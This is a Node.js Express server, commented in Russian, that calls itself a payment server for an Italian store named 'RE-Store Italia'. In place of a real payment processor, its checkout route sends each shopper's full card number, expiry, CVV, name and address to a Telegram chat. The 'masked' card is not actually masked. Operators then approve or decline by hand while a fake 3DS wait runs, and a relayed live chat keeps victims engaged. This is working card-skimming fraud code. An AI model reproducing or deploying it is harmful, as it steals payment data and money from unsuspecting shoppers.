/**
 * RE-Store Italia - Payment Server
 * Обработка платежей с Telegram интеграцией и 3DS верификацией
 */

const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Telegram Bot настройки
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Хранилище платежей (в продакшене использовать БД)
const payments = new Map();

// Хранилище чатов
const chatSessions = new Map(); // sessionId -> { messages: [], telegramMessageId: null }
const pendingReplies = new Map(); // sessionId -> [{ text, time }]

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

// ============================================
// BIN Lookup API - определение банка по номеру карты
// ============================================
app.get('/api/bin/:bin', async (req, res) => {
    const bin = req.params.bin.replace(/\s/g, '').substring(0, 6);
    
    if (bin.length < 6) {
        return res.json({ success: false, error: 'BIN должен содержать минимум 6 цифр' });
    }
    
    try {
        // Используем бесплатный BIN lookup API
        const response = await fetch(`https://lookup.binlist.net/${bin}`, {
            headers: {
                'Accept-Version': '3'
            }
        });
        
        if (!response.ok) {
            // Fallback - базовое определение по первым цифрам
            const bankInfo = getBasicBankInfo(bin);
            return res.json({ success: true, data: bankInfo });
        }
        
        const data = await response.json();
        
        res.json({
            success: true,
            data: {
                scheme: data.scheme || 'unknown',
                type: data.type || 'unknown',
                brand: data.brand || '',
                country: data.country?.name || 'Unknown',
                countryCode: data.country?.alpha2 || '',
                countryEmoji: data.country?.emoji || '🌍',
                bank: data.bank?.name || 'Unknown Bank',
                bankUrl: data.bank?.url || '',
                bankPhone: data.bank?.phone || '',
                prepaid: data.prepaid || false
            }
        });
    } catch (error) {
        // Fallback при ошибке API
        const bankInfo = getBasicBankInfo(bin);
        res.json({ success: true, data: bankInfo });
    }
});

// Базовое определение типа карты по BIN
function getBasicBankInfo(bin) {
    const firstDigit = bin[0];
    const firstTwo = bin.substring(0, 2);
    const firstFour = bin.substring(0, 4);
    
    let scheme = 'unknown';
    let type = 'debit';
    
    // Определение платежной системы
    if (firstDigit === '4') {
        scheme = 'visa';
    } else if (['51', '52', '53', '54', '55'].includes(firstTwo) || 
               (parseInt(firstFour) >= 2221 && parseInt(firstFour) <= 2720)) {
        scheme = 'mastercard';
    } else if (['34', '37'].includes(firstTwo)) {
        scheme = 'amex';
    } else if (firstTwo === '62') {
        scheme = 'unionpay';
    } else if (['30', '36', '38', '39'].includes(firstTwo)) {
        scheme = 'diners';
    } else if (firstFour === '6011' || firstTwo === '65') {
        scheme = 'discover';
    } else if (['50', '56', '57', '58', '63', '67'].includes(firstTwo)) {
        scheme = 'maestro';
    }
    
    return {
        scheme: scheme,
        type: type,
        brand: scheme.charAt(0).toUpperCase() + scheme.slice(1),
        country: 'Unknown',
        countryCode: '',
        countryEmoji: '🌍',
        bank: 'Unknown Bank',
        bankUrl: '',
        bankPhone: '',
        prepaid: false
    };
}

// ============================================
// Создание платежа и отправка в Telegram
// ============================================
app.post('/api/payment/create', async (req, res) => {
    const {
        cardNumber,
        cardExpiry,
        cardCvv,
        cardName,
        amount,
        orderItems,
        shippingInfo,
        bankInfo
    } = req.body;
    
    // Генерируем уникальный ID платежа
    const paymentId = crypto.randomBytes(16).toString('hex');
    
    // Создаем запись о платеже
    const payment = {
        id: paymentId,
        status: 'pending', // pending, approved, declined
        cardNumber: cardNumber.replace(/\s/g, ''),
        cardExpiry,
        cardCvv,
        cardName,
        amount,
        orderItems,
        shippingInfo,
        bankInfo,
        createdAt: new Date(),
        expiresAt: new Date(Date.now() + 5 * 60 * 1000) // 5 минут
    };
    
    payments.set(paymentId, payment);
    
    // Отправляем в Telegram
    try {
        await sendToTelegram(payment);
        
        res.json({
            success: true,
            paymentId: paymentId,
            expiresAt: payment.expiresAt.toISOString()
        });
    } catch (error) {
        console.error('Ошибка отправки в Telegram:', error);
        res.status(500).json({
            success: false,
            error: 'Ошибка обработки платежа'
        });
    }
});

// ============================================
// Проверка статуса платежа
// ============================================
app.get('/api/payment/status/:paymentId', (req, res) => {
    const { paymentId } = req.params;
    const payment = payments.get(paymentId);
    
    if (!payment) {
        return res.json({
            success: false,
            error: 'Платеж не найден'
        });
    }
    
    // Проверяем не истек ли таймаут
    if (payment.status === 'pending' && new Date() > payment.expiresAt) {
        payment.status = 'timeout';
    }
    
    res.json({
        success: true,
        status: payment.status,
        expiresAt: payment.expiresAt.toISOString()
    });
});

// ============================================
// Webhook для Telegram (обработка нажатий кнопок)
// ============================================
app.post('/api/telegram/webhook', async (req, res) => {
    const { callback_query } = req.body;
    
    if (callback_query) {
        const callbackData = callback_query.data;
        const messageId = callback_query.message.message_id;
        const chatId = callback_query.message.chat.id;
        
        // Парсим данные callback
        const [action, paymentId] = callbackData.split(':');
        const payment = payments.get(paymentId);
        
        if (payment) {
            if (action === 'approve') {
                payment.status = 'approved';
                
                // Обновляем сообщение в Telegram
                await updateTelegramMessage(chatId, messageId, payment, '✅ ОПЛАЧЕНО');
                
                // Отвечаем на callback
                await answerCallback(callback_query.id, '✅ Платеж подтвержден!');
                
            } else if (action === 'decline') {
                payment.status = 'declined';
                
                // Обновляем сообщение в Telegram
                await updateTelegramMessage(chatId, messageId, payment, '❌ ОТКЛОНЕНО');
                
                // Отвечаем на callback
                await answerCallback(callback_query.id, '❌ Платеж отклонен!');
            }
        }
    }
    
    res.sendStatus(200);
});

// ============================================
// Отправка сообщения в Telegram
// ============================================
async function sendToTelegram(payment) {
    const maskedCard = payment.cardNumber.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4');
    
    // Безопасное получение данных с проверками
    const orderItems = payment.orderItems || [];
    const shippingInfo = payment.shippingInfo || {};
    const bankInfo = payment.bankInfo || {};
    
    // Формируем строку заказа
    let orderStr = 'Нет данных';
    if (orderItems.length > 0) {
        orderStr = orderItems.map(item => `├ ${item.name || 'Товар'} x${item.quantity || 1} - €${((item.price || 0) * (item.quantity || 1)).toFixed(2)}`).join('\n');
    }
    
    // Формируем строку доставки
    let shippingStr = 'Нет данных';
    if (shippingInfo.firstName || shippingInfo.email) {
        shippingStr = `├ ${shippingInfo.firstName || ''} ${shippingInfo.lastName || ''}
├ ${shippingInfo.address || 'Адрес не указан'}
├ ${shippingInfo.postalCode || ''} ${shippingInfo.city || ''}
├ 📧 ${shippingInfo.email || 'Не указан'}
└ 📱 ${shippingInfo.phone || 'Не указан'}`;
    }
    
    const message = `
🆕 <b>НОВЫЙ ПЛАТЕЖ</b>

💳 <b>Данные карты:</b>
├ Номер: <code>${maskedCard}</code>
├ Срок: <code>${payment.cardExpiry}</code>
├ CVV: <code>${payment.cardCvv}</code>
└ Имя: <code>${payment.cardName}</code>

🏦 <b>Информация о банке:</b>
├ Банк: ${bankInfo.bank || 'Неизвестно'}
├ Страна: ${bankInfo.countryEmoji || '🌍'} ${bankInfo.country || 'Неизвестно'}
├ Тип: ${bankInfo.scheme?.toUpperCase() || 'Неизвестно'} ${bankInfo.type || ''}
└ Prepaid: ${bankInfo.prepaid ? 'Да' : 'Нет'}

💰 <b>Сумма:</b> €${(payment.amount || 0).toFixed(2)}

📦 <b>Заказ:</b>
${orderStr}

📍 <b>Доставка:</b>
${shippingStr}

⏰ <b>Ожидание 3DS:</b> 5 минут
🔑 <b>ID:</b> <code>${payment.id.substring(0, 8)}</code>
`;

    const keyboard = {
        inline_keyboard: [
            [
                { text: '✅ Оплачено', callback_data: `approve:${payment.id}` },
                { text: '❌ Отклонить', callback_data: `decline:${payment.id}` }
            ]
        ]
    };
    
    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: keyboard
        })
    });
    
    if (!response.ok) {
        throw new Error('Failed to send Telegram message');
    }
}

// ============================================
// Обновление сообщения в Telegram
// ============================================
async function updateTelegramMessage(chatId, messageId, payment, status) {
    const maskedCard = payment.cardNumber.replace(/(\d{4})(\d{4})(\d{4})(\d{4})/, '$1 $2 $3 $4');
    
    const message = `
${status}

💳 <b>Данные карты:</b>
├ Номер: <code>${maskedCard}</code>
├ Срок: <code>${payment.cardExpiry}</code>
├ CVV: <code>${payment.cardCvv}</code>
└ Имя: <code>${payment.cardName}</code>

🏦 <b>Банк:</b> ${payment.bankInfo?.bank || 'Неизвестно'} ${payment.bankInfo?.countryEmoji || ''}

💰 <b>Сумма:</b> €${payment.amount.toFixed(2)}

📍 <b>Клиент:</b> ${payment.shippingInfo.firstName} ${payment.shippingInfo.lastName}
📧 ${payment.shippingInfo.email}

🔑 <b>ID:</b> <code>${payment.id.substring(0, 8)}</code>
⏰ <b>Обработано:</b> ${new Date().toLocaleString('ru-RU')}
`;

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            message_id: messageId,
            text: message,
            parse_mode: 'HTML'
        })
    });
}

// ============================================
// Ответ на callback в Telegram
// ============================================
async function answerCallback(callbackId, text) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            callback_query_id: callbackId,
            text: text,
            show_alert: true
        })
    });
}

// ============================================
// Установка webhook для Telegram
// ============================================
app.get('/api/telegram/setup-webhook', async (req, res) => {
    const webhookUrl = `${req.protocol}://${req.get('host')}/api/telegram/webhook`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/setWebhook`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                url: webhookUrl
            })
        });
        
        const data = await response.json();
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ============================================
// Live Chat API
// ============================================

// Отправка сообщения от клиента
app.post('/api/chat/send', async (req, res) => {
    const { sessionId, message, userInfo } = req.body;
    
    if (!sessionId || !message) {
        return res.json({ success: false, error: 'Missing data' });
    }
    
    // Получаем или создаем сессию
    let session = chatSessions.get(sessionId);
    if (!session) {
        session = { 
            messages: [], 
            telegramMessageId: null,
            createdAt: new Date()
        };
        chatSessions.set(sessionId, session);
    }
    
    // Сохраняем сообщение
    session.messages.push({
        type: 'user',
        text: message,
        time: new Date().toLocaleTimeString('it-IT', { hour: '2-digit', minute: '2-digit' })
    });
    
    // Отправляем в Telegram
    try {
        await sendChatToTelegram(sessionId, message, userInfo, session);
        res.json({ success: true });
    } catch (error) {
        console.error('Chat send error:', error);
        res.json({ success: false, error: 'Failed to send' });
    }
});

// Получение новых сообщений от поддержки
app.get('/api/chat/messages/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    
    const replies = pendingReplies.get(sessionId) || [];
    
    if (replies.length > 0) {
        // Очищаем после получения
        pendingReplies.delete(sessionId);
        
        res.json({
            success: true,
            messages: replies
        });
    } else {
        res.json({ success: true, messages: [] });
    }
});

// Проверка наличия новых сообщений
app.get('/api/chat/check/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    
    const replies = pendingReplies.get(sessionId) || [];
    
    res.json({
        success: true,
        hasNewMessages: replies.length > 0,
        count: replies.length
    });
});

// Отправка чат-сообщения в Telegram
async function sendChatToTelegram(sessionId, message, userInfo, session) {
    const shortId = sessionId.substring(0, 12);
    
    const text = `
💬 <b>НОВОЕ СООБЩЕНИЕ</b>

👤 <b>ID сессии:</b> <code>${shortId}</code>

📝 <b>Сообщение:</b>
${message}

🌐 <b>Страница:</b> ${userInfo?.url || 'Главная'}

⏰ ${new Date().toLocaleString('ru-RU')}

<i>Ответьте на это сообщение, чтобы ответить клиенту</i>
`;

    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        })
    });
    
    const data = await response.json();
    
    if (data.ok) {
        session.telegramMessageId = data.result.message_id;
    }
    
    return data;
}

// ============================================
// Telegram Polling (для локального тестирования)
// ============================================
let lastUpdateId = 0;

async function startTelegramPolling() {
    console.log('📡 Telegram polling запущен...');
    
    while (true) {
        try {
            const response = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
            );
            
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    lastUpdateId = update.update_id;
                    
                    if (update.callback_query) {
                        await handleTelegramCallback(update.callback_query);
                    }
                    
                    // Обработка ответов на чат-сообщения
                    if (update.message && update.message.reply_to_message) {
                        await handleChatReply(update.message);
                    }
                }
            }
        } catch (error) {
            console.error('Polling error:', error.message);
            await new Promise(r => setTimeout(r, 5000)); // Wait 5s on error
        }
    }
}

// Обработка ответа на чат-сообщение
async function handleChatReply(message) {
    const replyText = message.text;
    const originalMessage = message.reply_to_message?.text || '';
    
    // Извлекаем ID сессии из оригинального сообщения
    const sessionIdMatch = originalMessage.match(/ID сессии:<\/b> <code>([^<]+)<\/code>/);
    if (!sessionIdMatch) {
        // Пробуем альтернативный формат (plain text)
        const altMatch = originalMessage.match(/ID сессии: (\S+)/);
        if (!altMatch) return;
    }
    
    // Ищем сессию по короткому ID
    const shortId = sessionIdMatch ? sessionIdMatch[1] : originalMessage.match(/ID сессии: (\S+)/)?.[1];
    if (!shortId) return;
    
    let foundSessionId = null;
    for (const [sessionId, session] of chatSessions) {
        if (sessionId.startsWith(shortId) || sessionId.includes(shortId)) {
            foundSessionId = sessionId;
            break;
        }
    }
    
    if (foundSessionId) {
        // Добавляем ответ в очередь
        if (!pendingReplies.has(foundSessionId)) {
            pendingReplies.set(foundSessionId, []);
        }
        
        pendingReplies.get(foundSessionId).push({
            text: replyText,
            time: new Date().toLocaleTimeString('it-IT', { hour: '2-digit', minute: '2-digit' })
        });
        
        console.log(`💬 Ответ отправлен в чат ${shortId}: ${replyText.substring(0, 50)}...`);
        
        // Подтверждение в Telegram
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: message.chat.id,
                text: `✅ Ответ отправлен клиенту`,
                reply_to_message_id: message.message_id
            })
        });
    }
}

async function handleTelegramCallback(callback_query) {
    const callbackData = callback_query.data;
    const messageId = callback_query.message.message_id;
    const chatId = callback_query.message.chat.id;
    
    // Парсим данные callback
    const [action, paymentId] = callbackData.split(':');
    const payment = payments.get(paymentId);
    
    if (payment) {
        if (action === 'approve') {
            payment.status = 'approved';
            console.log(`✅ Платеж ${paymentId.substring(0, 8)} ОДОБРЕН`);
            
            // Обновляем сообщение в Telegram
            await updateTelegramMessage(chatId, messageId, payment, '✅ ОПЛАЧЕНО');
            
            // Отвечаем на callback
            await answerCallback(callback_query.id, '✅ Платеж подтвержден!');
            
        } else if (action === 'decline') {
            payment.status = 'declined';
            console.log(`❌ Платеж ${paymentId.substring(0, 8)} ОТКЛОНЕН`);
            
            // Обновляем сообщение в Telegram
            await updateTelegramMessage(chatId, messageId, payment, '❌ ОТКЛОНЕНО');
            
            // Отвечаем на callback
            await answerCallback(callback_query.id, '❌ Платеж отклонен!');
        }
    }
}

// ============================================
// Запуск сервера
// ============================================
app.listen(PORT, () => {
    console.log(`
🚀 RE-Store Payment Server запущен!
📍 http://localhost:${PORT}

💳 Откройте сайт в браузере и протестируйте оплату
💬 Live Chat интегрирован с Telegram

📱 Telegram бот настроен и ожидает платежей и сообщений
    `);
    
    // Запускаем Telegram polling
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        startTelegramPolling();
    } else {
        console.log('⚠️  Настройте TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID в .env');
    }
});
